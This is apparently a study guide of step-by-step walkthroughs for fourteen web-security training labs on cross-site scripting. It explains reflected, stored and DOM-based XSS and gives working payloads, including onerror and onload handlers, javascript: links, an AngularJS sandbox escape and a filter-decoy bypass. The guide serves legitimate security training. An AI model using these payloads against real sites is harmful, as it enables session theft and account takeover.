# xss (cross site scripting )

# **Lab 1: Reflected XSS into HTML context with nothing encoded**

### **The Core Concept**

This lab introduces **Reflected Cross-Site Scripting (XSS)** in its simplest form.

- **What is it?** Reflected XSS occurs when an application receives data in an HTTP request (like a search term) and includes that data directly in the immediate HTTP response without properly sanitizing or encoding it.
- **The Flaw:** If you search for `<script>alert(1)</script>`, the server literally reflects that exact string back onto the webpage. The victim's browser sees the `<script>` tag, assumes the developer put it there intentionally, and executes the JavaScript code inside it.
- **The Goal:** To prove we can run arbitrary JavaScript on the page by triggering a simple `alert()` popup.

---

### **Step-by-Step Walkthrough**

You don't even need Burp Suite for this one; you can do it right in your browser.

### **Step 1: Locate the Vulnerability**

1. Open the lab.
2. You will see a standard blog site with a **Search** box at the top right.
3. Type a normal word, like `test`, and hit **Search**.
4. Notice the page says: *0 search results for 'test'*. The application took your input (`test`) and reflected it right onto the HTML page.

### **Step 2: Inject the Payload**

Since we know our input is reflected directly onto the page without any filtering, let's try injecting some HTML and JavaScript.

1. Click inside the search box again.
2. Type or paste the following payload:
    
    **HTML**
    
    `<script>alert(1)</script>`
    
    - *What this does:* `<script>` tells the browser that the following text is JavaScript, not HTML. `alert(1)` is a built-in JavaScript function that creates a pop-up box displaying the number 1.
3. Click **Search**.

### **Step 3: Execute and Solve**

1. The page will load, and an alert box displaying "1" will pop up on your screen.
2. Click **OK** on the alert box.
3. Congratulations, the lab is solved!

# **Lab 2 : Stored XSS into HTML context with nothing encoded**

### **The Core Concept**

This lab introduces **Stored Cross-Site Scripting (XSS)**, also known as Persistent XSS.

- **What is it?** While Reflected XSS (the previous lab) only happens instantly when you click a specific rigged link, Stored XSS is much more dangerous. Your malicious script is permanently saved (stored) in the website's database—for example, as a forum post, a user profile, or a blog comment.
- **The Flaw:** When the application saves your input and later displays it to other users without sanitizing or encoding the HTML tags, the script executes in the browser of *every single person* who visits that page.
- **The Goal:** To prove we can store arbitrary JavaScript on the server by putting an `alert()` payload into a blog comment.

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely within your browser.

### **Step 1: Locate the Vulnerability**

1. Open the lab.
2. Click on any of the **Blog Posts** on the main page (e.g., "The benefits of a mindful diet").
3. Scroll down to the bottom of the article to find the **"Leave a comment"** section.

### **Step 2: Inject the Payload**

We know the application saves comments and displays them to everyone who reads the blog. Let's try to make our comment execute code.

1. Click inside the **Comment** box.
2. Type or paste the exact same payload we used in the last lab:
    
    **HTML**
    
    `<script>alert(1)</script>`
    
3. Fill out the required secondary fields with dummy data:
    - **Name:** `hacker`
    - **Email:** `test@test.com`
    - **Website:** `http://example.com`

### **Step 3: Execute and Solve**

1. Click **Post comment**.
2. The server will thank you for your comment. Click the **"Back to blog"** link.
3. As the blog page loads, it fetches all the comments from the database, including yours. When the browser reads your comment, it sees the `<script>` tags and executes them.
4. An alert box displaying "1" will pop up on your screen.
5. Click **OK**, and the lab is solved!
    - *(Note: Anyone else who visits this specific blog post from now on would also get this popup!)*

# **Lab 3 : DOM XSS in `document.write` sink using source `location.search`**

### **The Core Concept**

This lab introduces **DOM-Based Cross-Site Scripting (DOM XSS)**.
Unlike Reflected or Stored XSS where the backend server is responsible for returning the malicious script in the HTML, DOM XSS happens entirely within the victim's browser.

It involves two main parts:

1. **The Source:** Where the malicious data enters the application (e.g., the URL's query string, `location.search`).
2. **The Sink:** A dangerous JavaScript function that takes that data and executes it or renders it as HTML (e.g., `document.write()`, `innerHTML`, `eval()`).

**The Flaw:** The page's JavaScript takes your search term from the URL (the source) and uses `document.write()` (the sink) to build an image tag for tracking purposes. It drops your input directly into the `src` attribute of the `<img>` tag without sanitizing it.

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely within your browser using the Developer Tools.

### **Step 1: Investigate the Source and Sink**

First, we need to see exactly how the application handles our input.

1. Open the lab.
2. Type a unique, random string into the search box, like `hacker123`, and hit **Search**.
3. Right-click anywhere on the page and select **Inspect** to open your browser's Developer Tools.
4. Press `Ctrl+F` (or `Cmd+F` on Mac) in the Elements tab and search for your string: `hacker123`.
5. **Analyze:** You will find your string buried inside a JavaScript block at the bottom of the page, which generates HTML that looks like this:
`<img src="/resources/images/tracker.gif?searchTerms=hacker123">`

### **Step 2: Craft the Breakout Payload**

Because our input is being placed *inside* an existing HTML attribute (the `src` attribute, wrapped in double quotes), a simple `<script>alert(1)</script>` won't work immediately. It would just become part of the image URL.

We have to "break out" of the `<img>` tag first.

1. To close the `src` attribute's double quote, we type: `"`
2. To close the `<img>` tag itself, we type: `>`
3. Now that we are back in the standard HTML context, we can add our malicious payload: `<svg onload=alert(1)>`
    - *(Note: `<svg onload=alert(1)>` is a common, compact XSS payload that tells the browser to draw an invisible graphic and immediately fire an alert when it loads).*

**Final Payload:** `"><svg onload=alert(1)>`

If we inject this, the page's JavaScript will blindly write this into the DOM:
`<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)>">`

### **Step 3: Execute the Exploit**

1. Go back to the search box on the webpage.
2. Paste your payload: `"><svg onload=alert(1)>`
3. Click **Search**.
4. The browser reads the first part, closes the broken image tag, and then reads your `<svg>` tag. As soon as it tries to load the SVG, your JavaScript executes.
5. An alert box displaying "1" will pop up.
6. Click **OK**, and the lab is solved!

# **Lab 4 : DOM XSS in `innerHTML` sink using source `location.search`**

### **The Core Concept**

This lab demonstrates a specific quirk of **DOM XSS** involving the `innerHTML` sink.

- **The Sink:** The application uses `element.innerHTML = ...` to add your search term to the page.
- **The Catch:** Modern browsers generally **do not execute** `<script>` tags that are inserted via `innerHTML`. If you try `<script>alert(1)</script>`, the tag will be added to the page, but the code inside won't run. This is a built-in security feature.
- **The Bypass:** Since we can't use `<script>`, we must use an HTML element that supports **Event Handlers**, like an image (`<img>`) or an iframe (`<iframe>`). We intentionally break the element (e.g., give it a fake image source) so it fires an error event (`onerror`), which then executes our JavaScript.

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely within your browser.

### **Step 1: Investigate the Sink**

1. Open the lab.
2. Type a random string into the search box (e.g., `test`) and hit **Search**.
3. Right-click the word "test" on the page and select **Inspect**.
4. **Analyze:** You will see your input inside a `<span>` or `<div>` tag.
    - If you look at the page source (View Source), you won't see your input there. This confirms it is being added dynamically by JavaScript using `innerHTML`.

### **Step 2: Try the Standard Payload (And Fail)**

1. Try entering `<script>alert(1)</script>` into the search box.
2. **Observe:** Nothing happens. No popup.
3. **Inspect Element:** If you inspect the page, you will see the `<script>` tag *is* there! It just didn't execute. This confirms the sink is likely `innerHTML`.

### **Step 3: Craft the Bypass Payload**

We need an element that executes code *without* a script tag.

1. We will use an image tag: `<img>`.
2. We give it a broken source: `src=1` (There is no image named "1", so this will fail).
3. We attach an error handler: `onerror=alert(1)`.
    - *Logic:* "Try to load image '1'. If it fails (which it will), run `alert(1)`."

**Payload:** `<img src=1 onerror=alert(1)>`

### **Step 4: Execute the Exploit**

1. Go back to the search box.
2. Paste the payload:
    
    **HTML**
    
    `<img src=1 onerror=alert(1)>`
    
3. Click **Search**.
4. The browser inserts the image tag.
5. The browser tries to load the image source `1`.
6. The load fails immediately.
7. The `onerror` event triggers, firing the `alert(1)`.
8. Click **OK**, and the lab is solved!

# **Lab 5 : DOM XSS in jQuery anchor `href` attribute sink using `location.search` source**

### **The Core Concept**

This lab focuses on a very specific, yet incredibly common, type of DOM XSS involving **link attributes (`href`)**.

- **The Sink:** The application uses jQuery to find an anchor tag (`<a>`, which is a clickable link) and dynamically sets its `href` (destination URL) based on what is in the web address.
- **The Flaw:** If you place user input directly into an `href` attribute without validating it, an attacker doesn't need to break out of the HTML tag or use a `<script>` tag. They can simply use the **`javascript:` pseudo-protocol**.
- **How it works:** Browsers are designed to execute JavaScript if a URL starts with `javascript:`. For example, clicking `<a href="javascript:alert(1)">Click Me</a>` will immediately run the code instead of taking you to a new web page.

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely within your browser.

### **Step 1: Locate the Vulnerability**

First, we need to find the page where the application takes data from the URL and puts it into a link.

1. Open the lab.
2. Click on the **"Submit feedback"** link at the top of the page.
3. Look at your browser's address bar. The URL should look something like this:
`.../feedback?returnPath=/`
4. Notice the `returnPath` parameter. This tells the application where to send the user if they click the "Back" button.

### **Step 2: Investigate the Sink**

Let's see exactly how the application uses that `returnPath` value.

1. Change the URL in your address bar to include a random word, like this:
`.../feedback?returnPath=/hacker123`
2. Hit **Enter** to load the page.
3. Scroll down to the **"Back"** link at the bottom of the form.
4. Right-click the "Back" link and select **Inspect** to open your Developer Tools.
5. **Analyze:** Look at the HTML code for the link. It will look like this:
`<a id="backLink" href="/hacker123">Back</a>`*The application took your input from the URL (`location.search`) and placed it directly into the `href` attribute!*

### **Step 3: Craft the Exploit**

Since our input lands perfectly inside the `href` attribute, we don't need to break out with brackets like `">`. We just need to provide a URL that executes code.

1. We will use the `javascript:` protocol.
2. The lab asks us to alert the user's cookie, so our payload will be: `javascript:alert(document.cookie)`

### **Step 4: Execute the Exploit**

1. Go back up to your browser's address bar.
2. Replace the `returnPath` value with your payload:
`.../feedback?returnPath=javascript:alert(document.cookie)`
3. Hit **Enter** to reload the page.
*(Note: Nothing happens yet! Why? Because the payload is sitting inside a link waiting to be clicked).*
4. Scroll down to the **"Back"** link.
5. **Click "Back".**
6. The browser attempts to "navigate" to your JavaScript URL, which causes it to execute the code. An alert box displaying the session cookie will pop up.
7. Click **OK**, and the lab is solved!

# **Lab 6 : DOM XSS in jQuery selector sink using a hashchange event**

### **The Core Concept**

This lab introduces a slightly more complex DOM XSS scenario involving **events** and the **URL Hash**.

- **The Source (`location.hash`):** This is the part of a URL after the `#` symbol (e.g., `website.com/#contact`). Developers often use it to auto-scroll to a specific part of a page.
- **The Sink (jQuery `$()`):** The application uses jQuery's `$()` selector to find the element mentioned in the hash. However, if you pass a string starting with `<` into `$()`, older versions of jQuery will actually try to *create* that HTML element on the page instead of just selecting it.
- **The Trigger (`hashchange`):** The vulnerable code is wrapped in an event listener that waits for a `hashchange` event. This means the vulnerability only triggers when the URL hash *changes* while the user is already on the page. We can't just send them a static link; we have to force the hash to change dynamically.

---

### **Step-by-Step Walkthrough**

You can complete this lab using your browser and the provided Exploit Server.

### **Step 1: Understand the Vulnerable Code**

1. Open the lab home page.
2. Right-click the page, select **Inspect**, and go to the **Sources** or **Debugger** tab (or just view the page source).
3. Look for the JavaScript at the bottom of the page. You will see code that looks like this:
    
    **JavaScript**
    
    `$(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });`
    
4. **Analyze:** The code listens for a `hashchange`. When it happens, it takes the hash, decodes it, and drops it straight into the `$()` jQuery function. If we put an HTML tag like `<img src=x onerror=print()>` into the hash, jQuery will execute it.

### **Step 2: Craft the Exploit Logic**

Because the code only runs when the hash *changes*, we have to trick the victim's browser into changing the URL hash after the page has already loaded. We do this using a hidden iframe.

1. We load the victim's home page inside an `<iframe>` with a blank hash (`#`).
2. We use the `onload` attribute of the iframe. This tells the browser: *"Wait until the iframe finishes loading, and THEN do something."*
3. The "something" we do is append our malicious payload to the iframe's URL. This triggers the `hashchange` event on the victim's page, executing our code.

### **Step 3: Build the Payload**

1. Go to the **Exploit Server** (button in the top banner).
2. In the **Body** section, paste the following:
    
    **HTML**
    
    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
    
    - **Crucial Edit:** Replace `YOUR-LAB-ID` with your actual lab domain.
    - *Explanation:* `this.src+='...'` takes the current source (which ends in `#`) and adds our malicious image tag to it. The `print()` function is just a harmless way to prove we can execute JavaScript (it opens the browser's print dialog).

### **Step 4: Execute and Solve**

1. Click **Store** to save your exploit.
2. Click **View exploit** to test it on yourself.
    - You should see a blank page (the iframe), and then your browser's "Print" dialog box should pop up. This means the exploit works! Cancel the print dialog.
3. Go back to the Exploit Server.
4. Click **Deliver exploit to victim**.
5. The lab will be marked as solved!

---

# **Lab 7 : Reflected XSS into attribute with angle brackets HTML-encoded**

### **The Core Concept**

This lab demonstrates **Reflected XSS in an Attribute Context**.
Sometimes, developers protect their websites by encoding angle brackets (`<` and `>`) into safe HTML entities (`&lt;` and `&gt;`). This prevents you from breaking out of the current HTML tag to start a new `<script>` tag.

However, if they forget to encode **quotation marks** (`"`), and your input lands inside an HTML attribute (like `value="..."`), you can still exploit it.

- **The Trap:** You are inside `<input value="YOUR_INPUT">`.
- **The Constraint:** You cannot use `">` to close the tag because the `>` gets encoded.
- **The Trick:** You use a quote `"` to close the *attribute* value, but stay inside the *same tag*. Then, you inject a new attribute—specifically an **Event Handler** (like `onmouseover`)—that executes JavaScript when a user interacts with the element.

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely within your browser.

### **Step 1: Locate the Reflection**

1. Open the lab.
2. Type a unique string into the search box, like `hacker123`.
3. Click **Search**.
4. Right-click the search box (where your text still appears) and select **Inspect**.
5. **Analyze:** Look at the HTML. It likely looks like this:HTML
    
    `<input type="text" class="search-box" name="search" value="hacker123">`
    
    Your input is sitting safely inside the `value` attribute.
    

### **Step 2: Test the Constraints**

1. Try to break out using the standard tag closer: `"><script>alert(1)</script>`.
2. Hit **Search** and inspect the element again.
3. **Result:** The HTML will look like this:HTML
    
    `<input ... value="&quot;&gt;&lt;script&gt;...">`
    
    The server encoded your angle brackets (`>`  became `&gt;`), rendering the script useless. However, look closely at the quotes. If the quote `"` is **not** encoded (it remains `"` instead of `&quot;`), we have a way in.
    

### **Step 3: Craft the Attribute Injection**

Since we are trapped inside the `input` tag, we will just add a new "feature" to it.

1. **Close the current attribute:** Start with a double quote `"` to finish the `value="..."` attribute.
2. **Add a new attribute:** Add a space, then type an event handler. `onmouseover` is a good choice because it triggers easily.
3. **Add the payload:** Set the event to `alert(1)`.
4. **Fix the syntax:** You might need to add a trailing `"` or just leave it open (browsers are forgiving).

**Payload:** `" onmouseover="alert(1)`

*This transforms the HTML into:*

HTML

`<input ... value="" onmouseover="alert(1)">`

*The browser sees an empty value, followed by a valid `onmouseover` event handler.*

### **Step 4: Execute the Exploit**

1. Paste the payload into the search box:
    
    **Plaintext**
    
    `" onmouseover="alert(1)`
    
2. Click **Search**.
3. **Trigger the Event:** The page reloads. Move your mouse cursor **over the search box**.
4. Because the `onmouseover` attribute is now part of the tag, the JavaScript executes immediately.
5. An alert box displaying "1" will pop up, and the lab is solved!

# **Lab 8 : Stored XSS into anchor `href` attribute with double quotes HTML-encoded**

Here is the beginner-friendly, step-by-step walkthrough for the **Stored XSS into anchor href attribute with double quotes HTML-encoded** lab.

### **The Core Concept**

This lab demonstrates **Stored XSS in an `href` Attribute**.
It combines two concepts we've already seen: saving malicious input to a database (Stored XSS) and executing code via a link (the `javascript:` pseudo-protocol).

- **The Trap:** The application takes the URL you provide in the "Website" field of a blog comment and turns the author's name into a clickable link: `<a href="YOUR_WEBSITE">Author Name</a>`.
- **The Constraint:** The server is smart enough to encode double quotes (`"` becomes `&quot;`). This means you **cannot** break out of the `href` attribute to add an `onmouseover` event like we did in the previous lab.
- **The Trick:** You don't need to break out! Because your input defines the actual destination of the link, you can simply provide a JavaScript URL. When someone clicks the author's name, the browser executes the script instead of navigating to a new page.

---

### **Step-by-Step Walkthrough**

You can easily complete this lab entirely within your browser without strictly needing Burp Suite.

### **Step 1: Investigate the Vulnerability**

Let's see how the application handles the "Website" field.

1. Open the lab and click on any **Blog Post** (e.g., "The benefits of an automated lifestyle").
2. Scroll down to the **Leave a comment** section.
3. Submit a benign test comment:
    - **Comment:** `Testing the link`
    - **Name:** `TestUser`
    - **Email:** `test@test.com`
    - **Website:** `http://hacker123.com`
4. Click **Post comment**, then click **Back to blog**.
5. Find your comment. Notice that your name (`TestUser`) is now a clickable link.
6. Right-click your name and select **Inspect**.
    - **Analyze the HTML:** You will see `<a id="author" href="http://hacker123.com">TestUser</a>`. Your input landed perfectly inside the `href`.

### **Step 2: Craft the Payload**

Since double quotes are encoded, we can't use `" onmouseover="alert(1)`. Instead, we will make the entire URL a JavaScript execution command.

**Payload:** `javascript:alert(1)`

### **Step 3: Execute the Exploit**

1. Scroll back down to the **Leave a comment** section on the same blog post.
2. Leave a new, malicious comment:
    - **Comment:** `Click my name!`
    - **Name:** `EvilHacker`
    - **Email:** `evil@test.com`
    - **Website:** `javascript:alert(1)` *(Paste your payload here!)*
3. Click **Post comment**, then click **Back to blog**.

### **Step 4: Trigger the Payload and Solve**

1. Scroll down to find your new comment.
2. Click on your author name (**EvilHacker**).
3. Because the link's destination is `javascript:alert(1)`, the browser immediately executes the code.
4. An alert box displaying "1" will pop up, and the lab is solved!

# **Lab 9 : Reflected XSS into a JavaScript string with angle brackets HTML encoded**

### **The Core Concept**

This lab introduces **Reflected XSS in a JavaScript Context**.
Up until now, our input was being dropped into standard HTML (like a `<div>` or an attribute). Here, the server is dropping our input directly *inside an existing `<script>` tag*, specifically into a JavaScript string.

- **The Trap:** The application takes your search query and assigns it to a variable: `var searchTerms = 'YOUR_INPUT';`.
- **The Constraint:** The server encodes angle brackets (`<` and `>`), meaning you cannot simply type `</script><script>alert(1)</script>` to break out of the script block entirely.
- **The Trick:** You are *already* inside a `<script>` block! You don't need HTML tags. You just need to break out of the string using a single quote (`'`), execute your code, and ensure the rest of the JavaScript line doesn't throw a syntax error.

---

### **Step-by-Step Walkthrough**

You can complete this lab directly in your browser.

### **Step 1: Locate the Vulnerability**

Let's see exactly where our input lands in the page's source code.

1. Open the lab.
2. Type a unique string into the search box, like `hacker123`.
3. Click **Search**.
4. Right-click the page and select **View Page Source** (or use **Inspect**).
5. Search the source code (Ctrl+F) for `hacker123`.
6. **Analyze:** You will find your input sitting inside a `<script>` block at the bottom of the page:JavaScript
    
    `<script>
        var searchTerms = 'hacker123';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>`
    

### **Step 2: Understand the Breakout Logic**

If we just type `alert(1)`, the code becomes `var searchTerms = 'alert(1)';`. It's just a harmless string of text. We need to escape the single quotes.

If we type `'-alert(1)-'`, look at what happens to the JavaScript:
`var searchTerms = ''-alert(1)-'';`

*Why does this work?*

1. The first `'` closes the string the developer opened, resulting in an empty string `''`.
2. The  is a math operator (subtraction).
3. `alert(1)` is a function.
4. The second  is another math operator.
5. The final `'` starts a new string, which is immediately closed by the developer's original closing quote, resulting in another empty string `''`.

Because we used the `-` operator, JavaScript is forced to evaluate the math equation: `(Empty String) minus (The result of the alert function) minus (Empty String)`. To solve the math, the browser **must execute the `alert(1)` function**!

### **Step 3: Craft and Execute the Payload**

1. Go back to the search box on the webpage.
2. Paste the payload:JavaScript
    
    `'-alert(1)-'`
    
    *(Note: You could also use `';alert(1)//` to break out, execute, and comment out the rest of the line, but the subtraction trick is very elegant and is what the lab solution suggests).*
    
3. Click **Search**.
4. The browser parses the new JavaScript equation, executes the `alert()`, and the popup appears.
5. Click **OK**, and the lab is solved!

 ****

# **Lab 10 : DOM XSS in `document.write` sink using source `location.search` inside a select element**

### **The Core Concept**

This lab introduces **Context Breakout within Specific HTML Elements**.
We are back to dealing with DOM XSS where the script reads the URL (`location.search`) and writes it to the page (`document.write`). However, this time, our input lands *inside* a `<select>` tag (a drop-down menu).

- **The Trap:** Browsers are strict about what HTML tags are allowed inside a `<select>` element. Usually, they only expect `<option>` tags. If you just inject `<script>alert(1)</script>` directly into it, the browser might ignore it or render it as text because it violates the expected HTML structure.
- **The Solution:** We must first completely "close" the drop-down menu by injecting `</select>`. Once we break out of that restrictive container, we are back in the standard HTML body where `<script>` tags work perfectly.

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely within your browser's address bar.

### **Step 1: Find the Hidden Parameter**

First, we need to figure out what parameter the JavaScript is looking for.

1. Open the lab.
2. Click on any **View details** button to go to a product page.
3. Look at the URL. It will look something like this:
`.../product?productId=1`
4. Right-click the page and select **View Page Source**.
5. Scroll down to the bottom where the "Check stock" form is. You will see a JavaScript block that looks like this:
    
    **JavaScript**
    
    `var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected="selected" value="'+store+'">'+store+'</option>');
    }
    // ... loop through other stores ...
    document.write('</select>');`
    
6. **Analyze:** The code checks the URL for a parameter called `storeId`. If it exists, it writes an `<option>` tag containing that value directly into the `<select>` dropdown.

### **Step 2: Test the Injection Point**

Let's feed the script what it wants and see where our input lands.

1. Go to your browser's address bar.
2. Add `&storeId=HACKER` to the end of the URL:
`.../product?productId=1&storeId=HACKER`
3. Hit **Enter** to reload the page.
4. Scroll down to the "Check stock" dropdown. You will see "HACKER" is now pre-selected!
5. Right-click the dropdown and **Inspect** it.
    - The HTML looks like this: `<option selected="selected" value="HACKER">HACKER</option>`

### **Step 3: Craft the Breakout Payload**

We are trapped inside the `value` attribute, which is inside the `<option>` tag, which is inside the `<select>` tag. We have to break out of all three like a Russian nesting doll.

1. Close the `value` attribute with a quote: `"`
2. Close the `<option>` tag with a bracket: `>`
3. Close the `<select>` tag: `</select>`
4. Now we are free to inject our script: `<script>alert(1)</script>`

**Final Payload:** `"></select><script>alert(1)</script>`

### **Step 4: Execute the Exploit**

1. Go back to your browser's address bar.
2. Replace `HACKER` with your payload:
`.../product?productId=1&storeId="></select><script>alert(1)</script>`
3. Hit **Enter**.
4. The browser executes the JavaScript, writes the broken tags, closes the select menu early, and executes your script tag.
5. An alert box displaying "1" will pop up, and the lab is solved!

# **Lab 11 : DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded   (This technique is useful when angle brackets are being encoded.  )**

### **The Core Concept**

This lab introduces **Client-Side Template Injection (CSTI)** using **AngularJS**.

- **The Setup:** AngularJS is a popular frontend JavaScript framework. When developers use it, they define an active area on the webpage using an HTML attribute called `ng-app`.
- **The Magic:** Inside any element with `ng-app`, Angular constantly scans the HTML for double curly braces `{{ ... }}`. If it finds them, it treats whatever is inside as **executable code** (an expression) and evaluates it.
- **The Flaw:** The backend server is doing its job perfectly—it is encoding angle brackets (`<` -> `&lt;`) so you can't inject a `<script>` tag. However, the backend server *doesn't* encode curly braces. When the encoded HTML arrives in your browser, AngularJS steps in, sees the curly braces you injected, and executes the code anyway!

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely within your browser.

### **Step 1: Discover the Framework**

First, we need to confirm that AngularJS is running and that our input falls within its active zone.

1. Open the lab.
2. Type a test string into the search box, like `hacker123`.
3. Click **Search**.
4. Right-click the page and select **View Page Source**.
5. Search (Ctrl+F) for `hacker123`.
6. Look at the HTML tags surrounding your input. You will see something like this:HTML
    
    `<body ng-app="">
        ...
        <h1>0 search results for 'hacker123'</h1>`
    
7. **Analyze:** The `<body>` tag has the `ng-app` attribute. This means the *entire page* is being actively scanned and processed by AngularJS.

### **Step 2: Test the Expression Engine**

Before firing a malicious payload, it's a good hacker habit to test if the template engine is actually evaluating curly braces.

1. Go back to the search box.
2. Type a simple math equation wrapped in Angular's syntax: `{{1+1}}`
3. Click **Search**.
4. Look at the page. Instead of saying "0 search results for '{{1+1}}'", it will say **"0 search results for '2'"**.
5. AngularJS did the math. We have code execution.

### **Step 3: Craft the Exploit Payload**

You might think we can just type `{{alert(1)}}`. Unfortunately, Angular has a built-in "sandbox" that prevents you from directly accessing global JavaScript functions like `alert()` or `window`.

To bypass this sandbox, we use a neat trick. We access an Angular object (like `$on`), access its underlying native JavaScript `constructor`, and use that constructor to build a brand new, unrestricted JavaScript function.

1. **The Object:** `$on` (an Angular scope object)
2. **The Escape:** `.constructor('alert(1)')` (creates a raw JavaScript function)
3. **The Execution:** `()` (calls the function we just created)

**Final Payload:** `{{$on.constructor('alert(1)')()}}`

### **Step 4: Execute the Exploit**

1. Go to the search box on the webpage.
2. Paste your payload:JavaScript
    
    `{{$on.constructor('alert(1)')()}}`
    
3. Click **Search**.
4. The server reflects the curly braces onto the page. AngularJS scans the page, sees the braces, evaluates the expression, builds the native function, and executes it.
5. An alert box displaying "1" will pop up, and the lab is solved!

# LAB 12 : Reflected DOM XSS

### **The Core Concept**

This lab introduces **Reflected DOM XSS**, which is a hybrid of two vulnerabilities we've seen:

1. **Reflected:** The server takes your input and echoes it back in an HTTP response (in this case, inside a JSON data packet, not an HTML page).
2. **DOM:** The client-side JavaScript on the webpage takes that JSON data and feeds it into a dangerous sink.
- **The Sink:** The application uses the notoriously dangerous **`eval()`** function. `eval()` takes a string of text and executes it as raw JavaScript code.
- **The Defense:** The server tries to protect itself by escaping quotation marks. If you type `"`, the server changes it to `\"` so you can't break out of the JSON string.
- **The Flaw:** The server forgets to escape **backslashes (`\`)**.
- **The Trick:** If you send `\"`, the server tries to escape your quote by adding its own backslash. The result becomes `\\"`. In JavaScript, `\\` translates to a single, harmless text backslash, which leaves your `"` completely unescaped and free to close the string!

---

### **Step-by-Step Walkthrough**

You can use Burp Suite to trace the logic, but you can execute the final payload directly in your browser.

### **Step 1: Track the Data (Source to Sink)**

Let's see how the application handles a normal search.

1. Open the lab.
2. Search for a simple string like `test`.
3. If you look at the network traffic (in Burp Suite or your browser's Network tab), you won't see `test` in the HTML. Instead, the page makes a background request that returns a JSON file looking like this:
`{"searchTerm":"test", "results":[]}`
4. If you inspect the page's JavaScript files (specifically `searchResults.js`), you will find the dangerous code:
`var searchResultsObj = eval('(' + responseText + ')');`*The page is taking the entire JSON response and executing it directly in the browser!*

### **Step 2: Defeat the Server's Escaping**

We are trapped inside the `"searchTerm":"..."` string.

1. If we try to close the string with a quote (`"`), the server sends back `\"`. The JavaScript reads this as part of the text, not as the end of the string.
2. We use the backslash trick. We type: `\"`
3. The server sees our quote and adds a backslash to escape it. Our input becomes: `\\"`
4. The JavaScript engine sees `\\` and says, "Okay, that's just a text backslash." Then it sees the `"` and says, "Ah, this is the end of the string!"

### **Step 3: Craft the Payload**

Now that we have successfully closed the string, we need to inject our `alert()` and fix the broken JSON syntax that follows it.

1. **Break out:** `\"` (Closes the string).
2. **Add logic:**  (A minus sign separates our string from the next command so the JavaScript doesn't crash).
3. **The Payload:** `alert(1)`
4. **Clean up:** We need to close the JSON object and comment out the rest of the server's junk (`, "results":[]}`). We do this with `}//`.

**Final Payload:** `\"-alert(1)}//`

*When this hits the `eval()` function, the browser executes this exact logic:*`eval('({"searchTerm":"\\"-alert(1)}//", "results":[]})');`

### **Step 4: Execute the Exploit**

1. Go to the search box on the webpage.
2. Paste the payload exactly as written:
    
    **JavaScript**
    
    `\"-alert(1)}//`
    
3. Click **Search**.
4. The server returns the JSON. The client-side JavaScript feeds it into `eval()`. The backslashes cancel each other out, the string closes, the math operator fires, and your alert executes.
5. An alert box displaying "1" will pop up, and the lab is solved!

# **Lab 13 : Stored DOM XSS**

 ****

### **The Core Concept**

This lab introduces **Stored DOM XSS**, and it highlights a very common mistake developers make when writing custom security filters in JavaScript.

- **The Setup:** Just like standard Stored XSS, you submit a comment, and the server saves it to a database. When a user visits the page, the server sends the comment data back (usually as raw JSON).
- **The Defense:** The client-side JavaScript takes that data and tries to make it safe before rendering it on the screen. It tries to filter out dangerous HTML tags (like `<` and `>`) using JavaScript's built-in `replace()` function.
- **The Flaw:** In JavaScript, if you use `replace()` with a basic string (e.g., `text.replace('<', '&lt;')`), **it only replaces the *very first* occurrence** it finds. To replace *all* occurrences, a developer must use a global regular expression (e.g., `text.replace(/</g, '&lt;')`).
- **The Exploit:** Because the filter only destroys the *first* set of angle brackets it sees, we can simply serve it a decoy! We put a harmless `<>` at the start of our comment. The filter eats the decoy, assumes its job is done, and completely ignores our actual malicious payload right next to it.

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely within your browser.

### **Step 1: Investigate the Comment System**

1. Open the lab.
2. Click on any **Blog Post** (e.g., "The benefits of a mindful diet").
3. Scroll down to the **Leave a comment** section.
4. If you were to post a standard XSS payload like `<script>alert(1)</script>`, you would notice that it doesn't execute. If you inspected the page, you'd see the brackets were converted to safe text (`&lt;script&gt;`).

### **Step 2: Exploit the Flawed Filter**

Let's use the decoy trick to bypass the client-side JavaScript filter.

1. We need an execution payload. An image tag with a broken source is perfect: `<img src=1 onerror=alert(1)>`
2. We need our decoy. A simple empty set of angle brackets will work: `<>`
3. Combine them. The filter will neutralize the `<>`, leaving the `<img>` tag perfectly intact.

**Final Payload:** `<><img src=1 onerror=alert(1)>`

### **Step 3: Execute and Solve**

1. Fill out the comment form with your payload:
    - **Comment:** `<><img src=1 onerror=alert(1)>`
    - **Name:** `Hacker`
    - **Email:** `hacker@test.com`
    - **Website:** `http://test.com`
2. Click **Post comment**.
3. Click **Back to blog**.
4. As the page loads, the client-side JavaScript fetches your comment. It replaces your first `<>` with safe HTML entities, but it blindly renders the `<img...>` tag into the DOM.
5. The browser tries to load image `1`, fails, triggers the `onerror` event, and executes your code.
6. An alert box displaying "1" will pop up, and the lab is solved!

# **Lab 14 : Reflected XSS into HTML context with most tags and attributes blocked**

### **The Core Concept**

This lab introduces **WAF Evasion** (Web Application Firewall bypass).
Real-world applications often use WAFs to automatically detect and block common attacks. If you send `<script>alert(1)</script>`, the WAF immediately intercepts it and throws a `400 Bad Request` or `403 Forbidden` error.

- **The Trap:** We can't rely on our standard payloads (like `<script>` or `<img onerror=...>`) because the firewall knows about them.
- **The Trick:** Firewalls rarely block *everything*. We will use **Fuzzing** (automated testing) to throw hundreds of HTML tags and event handlers at the server to see what slips through the cracks. Once we find the allowed "puzzle pieces," we assemble a custom exploit.

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite Professional or Community Edition** for this lab, specifically the **Intruder** tool.

### **Step 1: Verify the WAF**

First, let's prove the firewall is active.

1. Open the lab.
2. Type a standard payload into the search box: `<img src=1 onerror=print()>`
3. Click **Search**.
